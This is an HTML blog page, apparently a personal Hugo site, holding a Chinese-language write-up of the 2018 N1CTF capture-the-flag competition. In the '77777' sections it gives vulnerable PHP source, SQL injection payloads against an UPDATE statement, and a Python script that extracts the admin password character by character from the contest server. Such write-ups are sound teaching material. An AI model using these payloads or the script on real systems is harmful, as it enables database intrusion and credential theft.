@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="http://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="2018-N1ctf"/>
+  <meta name="twitter:description" content=".
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>2018-N1ctf &middot; Yang1k</title>
+		<link rel="shortcut icon" href="http://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="http://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="http://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='http://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='http://yang1k.github.io/post'>Archive</a>
+	<a href='http://yang1k.github.io/tags'>Tags</a>
+	<a href='http://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="http://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        2018-N1ctf
+                    </h1>
+                    <h2 class="headline">
+                    Mar 11, 2018 09:54
+                    · 151 words
+                    · 1 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="http://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#checkin">checkin</a></li>
+<li><a href="#77777">77777</a>
+<ul>
+<li><a href="#大致思路">大致思路</a></li>
+</ul></li>
+<li><a href="#77777-2">77777 - 2</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>.
+<!-- more --></p>
+
+<h2 id="checkin">checkin</h2>
+
+<p>题目给了#n1ctf2018的提示，直接提交不行，拿去谷歌搜了一下，发现在首页有IRC频道，然后拿去登录，之后看到一串base64，拿去解密得到flag。</p>
+
+<pre><code>N1CTF{Welc0me_to_N1CTF_2018}
+</code></pre>
+
+<h2 id="77777">77777</h2>
+
+<p>提示</p>
+
+<pre><code>This is my page.
+
+U can update my points in Profile.
+
+And the flag is `admin's password`:)
+</code></pre>
+
+<p>在profile处有一个显示My Points的地方。
+给的源码</p>
+
+<pre><code>&lt;?php
+
+function update_point($p,$points){
+	global $link;
+	$q = sprintf(&quot;update users set points=%d%s&quot;,$p,waf($points));
+	if (!$query = mysqli_query($link,$q)) {
+		return TRUE;
+	}
+}
+if (!update_point($_POST['flag'],$_POST['hi'])) {
+	echo &quot;sorry&quot;;
+}
+?&gt;
+</code></pre>
+
+<h3 id="大致思路">大致思路</h3>
+
+<p>注入点在\$_POST[&lsquo;hi&rsquo;]，在这里构造where语句来判断update语句有没有执行成功。根据My Points的值有没有更新为\$_POST[&lsquo;flag&rsquo;]的值来判断是否执行成功。
+测试后发现information_schema，database()都过滤了，剩下有where select from没过滤，根据提示猜测password存在于users表。</p>
+
+<p>在构造的时候出了一点问题，就是update后的子查询不能是update的表。官方报错为</p>
+
+<pre><code>update yang set id=111 where (select pass from yang)&gt;'a'
+You can't specify target table 'yang' for update in FROM clause
+</code></pre>
+
+<p>谷歌到了一篇文章来解决这个问题
+<a href="http://www.cnblogs.com/chy1000/archive/2010/03/02/1676282.html">http://www.cnblogs.com/chy1000/archive/2010/03/02/1676282.html</a>
+最终的payload</p>
+
+<pre><code>flag=333331&amp;hi=  where (select password from(select password from users)t) &gt;  'a'
+</code></pre>
+
+<p>然后去写脚本，写到最后也没跑出来，因为题目没有设置seesion的原因。大家同时更新一个表，所以之间相互影响很严重，最后手工一点点测试了出来(真的有点菜)。
+flag</p>
+
+<pre><code>注出的密码
+he3l3locat233
+
+</code></pre>
+
+<h2 id="77777-2">77777 - 2</h2>
+
+<p>paylaod</p>
+
+<pre><code>%2bconv(hex(substr((select password),1,4)),16,10)
+</code></pre>
+
+<p>题目还过滤了2,3,4,5这几个数字。所以只能一个一个加上去了</p>
+
+<p>根据这个姿势写的脚本</p>
+
+<pre><code>import requests
+import binascii
+import re
+url = 'http://47.52.137.90:20000/index.php'
+r = requests.session()
+a = '+1+1+1'
+sub = '1'
+flag = ''
+for x in range(1,20):
+	payload = {'flag':'0','hi':'+conv(hex(substr((select pw ),%s,1+1+1)),16,10)'%(sub)}
+	print(payload)
+	r1 =r.post(url,data=payload)
+	pw_10 = re.findall('&lt;grey&gt;My Points&lt;/grey&gt; |(\d*?)&lt;br/',r1.text)
+	str1 = binascii.unhexlify(hex(int(pw_10[1]))[2:]).decode('utf-8')//binascii.unhexlify16进制转字符
+	flag+=str1
+	print(flag)
+	sub+=a
+
+
+</code></pre>
+
+<p>跑出来的结果</p>
+
+<pre><code>hahah777a7aha77777aaaa
+</code></pre>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fyang1k.github.io%2fpost%2f2018-n1ctf%2f - 2018-N1ctf "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="http://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="http://yang1k.github.io/js/main.js"></script>
+<script src="http://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
